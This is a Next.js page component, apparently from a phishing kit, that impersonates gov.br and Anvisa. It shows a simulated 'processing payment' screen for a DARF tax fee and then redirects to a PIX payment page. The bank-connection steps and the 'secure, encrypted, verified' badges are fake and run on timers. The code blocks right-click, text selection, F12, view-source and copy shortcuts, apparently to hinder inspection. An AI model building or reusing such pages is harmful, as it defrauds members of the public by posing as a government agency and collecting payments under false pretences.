"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import {
  Bell,
  CreditCard,
  Building2,
  CheckCircle,
  Lock,
  Calendar,
  FileText,
  User,
  Banknote,
  ShieldCheck,
} from "lucide-react"

export default function PaymentPage() {
  const [cnpj, setCnpj] = useState("")
  const [currentStep, setCurrentStep] = useState(1)
  const [loadingTextIndex, setLoadingTextIndex] = useState(0)
  const router = useRouter()

  const loadingTexts = [
    "Carregando informações de pagamento...",
    "Verificando dados bancários...",
    "Processando DARF...",
    "Conectando com sistema PIX...",
    "Validando informações fiscais...",
    "Gerando código de pagamento...",
  ]

  useEffect(() => {
    // Check if CNPJ exists in session storage
    const storedCnpj = sessionStorage.getItem("cnpj")
    if (!storedCnpj) {
      router.push("/")
      return
    }
    setCnpj(storedCnpj)

    // Payment step progression
    const stepTimer = setTimeout(() => {
      if (currentStep < 3) {
        setCurrentStep((prev) => prev + 1)
      } else {
        setTimeout(() => {
          router.push("/payment-pix")
        }, 2000)
      }
    }, 1800)

    // Loading text rotation
    const textTimer = setInterval(() => {
      setLoadingTextIndex((prev) => (prev + 1) % loadingTexts.length)
    }, 2500)

    // Protection functions
    const handleContextMenu = (e: Event) => {
      e.preventDefault()
      return false
    }

    const handleSelectStart = (e: Event) => {
      e.preventDefault()
      return false
    }

    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "F12" || (e.ctrlKey && ["u", "s", "a", "c", "v", "x"].includes(e.key))) {
        e.preventDefault()
        return false
      }
    }

    const handleDragStart = (e: Event) => {
      e.preventDefault()
      return false
    }

    // Add event listeners
    document.addEventListener("contextmenu", handleContextMenu)
    document.addEventListener("selectstart", handleSelectStart)
    document.addEventListener("keydown", handleKeyDown)
    document.addEventListener("dragstart", handleDragStart)

    return () => {
      clearTimeout(stepTimer)
      clearInterval(textTimer)
      document.removeEventListener("contextmenu", handleContextMenu)
      document.removeEventListener("selectstart", handleSelectStart)
      document.removeEventListener("keydown", handleKeyDown)
      document.removeEventListener("dragstart", handleDragStart)
    }
  }, [currentStep, router])

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-green-50 via-blue-50 to-indigo-50 select-none"
      style={{ userSelect: "none" }}
    >
      {/* Header */}
      <header className="bg-white/95 backdrop-blur-md border-b border-white/20 fixed top-0 left-0 right-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center space-x-4">
              <img src="/images/govbr-logo-large-CK1AxAnO.png" alt="gov.br" className="h-8" />
              <div className="hidden sm:block">
                <h1 className="text-lg font-semibold text-gray-900">Anvisa</h1>
                <p className="text-sm text-gray-600">Ministério da Saúde</p>
              </div>
            </div>

            <div className="flex items-center space-x-4">
              <button className="p-2 text-gray-600 hover:text-gray-900 relative">
                <Bell className="w-5 h-5" />
                <span className="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full animate-ping"></span>
              </button>
              <div className="hidden md:block text-right">
                <p className="text-sm font-medium text-gray-900">Sistema</p>
                <p className="text-xs text-gray-600">gov.br</p>
              </div>
              <div className="w-10 h-10 rounded-full bg-gradient-to-r from-blue-500 to-indigo-600 flex items-center justify-center text-white font-semibold">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="w-5 h-5"
                >
                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                  <circle cx="12" cy="7" r="4"></circle>
                </svg>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Loading Area */}
      <main className="px-4 pt-20 pb-8 relative overflow-y-auto">
        <div className="text-center max-w-4xl w-full mx-auto">
          {/* Status Text */}
          <div className="mb-4">
            <h1 className="text-xl md:text-4xl lg:text-5xl font-bold text-gray-800 mb-2">Processando Pagamento</h1>
            <p className="text-sm md:text-xl text-gray-600 mb-2 animate-pulse">{loadingTexts[loadingTextIndex]}</p>
            <p className="text-xs md:text-base text-gray-500 animate-pulse">Aguarde alguns instantes</p>
          </div>

          {/* Progress Bar */}
          <div className="w-full max-w-lg mx-auto mb-4">
            <div className="h-2 bg-gray-200/50 rounded-full overflow-hidden">
              <div
                className="h-full bg-gradient-to-r from-green-500 via-green-400 to-green-300 rounded-full shadow-lg animate-pulse"
                style={{
                  width: "100%",
                  animation: "paymentProgress 5s ease-in-out",
                }}
              />
            </div>
          </div>

          {/* Security Indicators */}
          <div className="flex flex-wrap justify-center items-center mb-4 gap-1">
            <div className="flex items-center bg-green-50/80 border border-green-200/50 px-3 py-2 rounded-full">
              <ShieldCheck className="w-3 h-3 text-green-600 mr-1" />
              <span className="text-xs font-medium text-green-800">Seguro</span>
            </div>
            <div className="flex items-center bg-green-50/80 border border-green-200/50 px-3 py-2 rounded-full">
              <Lock className="w-3 h-3 text-green-600 mr-1" />
              <span className="text-xs font-medium text-green-800">Criptografado</span>
            </div>
            <div className="flex items-center bg-green-50/80 border border-green-200/50 px-3 py-2 rounded-full">
              <CheckCircle className="w-3 h-3 text-green-600 mr-1" />
              <span className="text-xs font-medium text-green-800">Verificado</span>
            </div>
          </div>

          {/* Payment Status Cards */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6 px-4">
            <div
              className={`bg-white/90 backdrop-blur-sm rounded-xl p-6 shadow-lg border border-white/20 transition-all duration-300 ${
                currentStep >= 1 ? "opacity-100 scale-100" : "opacity-60 scale-95"
              }`}
            >
              <div className="w-16 h-16 bg-gradient-to-r from-green-500 to-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <CreditCard className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-base md:text-lg font-bold text-gray-800 mb-2">Validando Pagamento</h3>
              <p className="text-xs md:text-sm text-gray-600">Verificando informações do DARF</p>
              <div className="mt-4 h-1 bg-gray-200 rounded-full overflow-hidden">
                <div
                  className={`h-full bg-green-500 rounded-full transition-all duration-1000 ${
                    currentStep >= 1 ? "w-full" : "w-0"
                  }`}
                  style={{
                    background:
                      currentStep >= 1 ? "linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent)" : "",
                    animation: currentStep >= 1 ? "shimmer 2s infinite" : "",
                  }}
                />
              </div>
            </div>

            <div
              className={`bg-white/90 backdrop-blur-sm rounded-xl p-6 shadow-lg border border-white/20 transition-all duration-300 ${
                currentStep >= 2 ? "opacity-100 scale-105 shadow-xl" : "opacity-60 scale-95"
              }`}
            >
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Building2 className="w-8 h-8 text-blue-600" />
              </div>
              <h3 className="text-base md:text-lg font-bold text-gray-800 mb-2">Conectando com Banco</h3>
              <p className="text-xs md:text-sm text-gray-600">Estabelecendo conexão segura</p>
              <div className="mt-4 h-1 bg-gray-200 rounded-full overflow-hidden">
                <div
                  className={`h-full bg-blue-500 rounded-full transition-all duration-1000 ${
                    currentStep >= 2 ? "w-full" : "w-0"
                  }`}
                />
              </div>
            </div>

            <div
              className={`bg-white/90 backdrop-blur-sm rounded-xl p-6 shadow-lg border border-white/20 transition-all duration-300 ${
                currentStep >= 3 ? "opacity-100 scale-105 shadow-xl" : "opacity-60 scale-95"
              }`}
            >
              <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <CheckCircle className="w-8 h-8 text-purple-600" />
              </div>
              <h3 className="text-base md:text-lg font-bold text-gray-800 mb-2">Gerando Código PIX</h3>
              <p className="text-xs md:text-sm text-gray-600">Preparando forma de pagamento</p>
              <div className="mt-4 h-1 bg-gray-200 rounded-full overflow-hidden">
                <div
                  className={`h-full bg-purple-500 rounded-full transition-all duration-1000 ${
                    currentStep >= 3 ? "w-full" : "w-0"
                  }`}
                />
              </div>
            </div>
          </div>

          {/* Payment Info */}
          <div className="bg-white/90 backdrop-blur-sm rounded-xl p-3 shadow-lg border border-white/20">
            <div className="flex flex-col items-center justify-center space-y-2 mb-3">
              <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                <Banknote className="w-4 h-4 text-green-600" />
              </div>
              <div className="text-center">
                <h4 className="text-sm font-bold text-gray-800">Valor do DARF</h4>
                <p className="text-xl font-bold text-green-600">R$ 248,79</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-2 text-xs text-gray-600">
              <div className="flex flex-col items-center p-2 bg-gray-50 rounded-lg">
                <Calendar className="w-4 h-4 text-blue-600 mb-1" />
                <span className="text-center">Vencimento: 02/09/2025</span>
              </div>
              <div className="flex flex-col items-center p-2 bg-gray-50 rounded-lg">
                <FileText className="w-4 h-4 text-purple-600 mb-1" />
                <span className="text-center">Código: 5952</span>
              </div>
              <div className="flex flex-col items-center p-2 bg-gray-50 rounded-lg col-span-2">
                <User className="w-4 h-4 text-orange-600 mb-1" />
                <span className="text-center text-xs">Sistema gov.br</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      <style jsx>{`
        @keyframes paymentProgress {
          0% { width: 0%; }
          25% { width: 30%; }
          50% { width: 60%; }
          75% { width: 85%; }
          100% { width: 100%; }
        }
        
        @keyframes shimmer {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(100%); }
        }
      `}</style>
    </div>
  )
}
